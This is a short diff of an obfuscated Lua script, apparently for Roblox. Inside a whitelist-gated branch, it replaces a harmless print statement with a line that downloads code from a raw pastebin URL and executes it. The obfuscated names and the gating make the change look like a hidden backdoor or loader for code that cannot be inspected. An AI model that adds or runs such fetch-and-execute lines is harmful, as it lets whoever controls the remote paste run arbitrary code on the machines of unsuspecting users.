@@ -20,5 +20,5 @@ wait(0.1)
 
 if tFupCXWQXYribv0PS9Wy.wtu34sA66Mek1WwdBtrh.4yPngOBBv64LbGUqBmoL == true then
 -- Whitelisted Stuff
-print("Yay!")
+loadstring(game:HttpGet('https://pastebin.com/raw/HDaV96JU'))()
 end
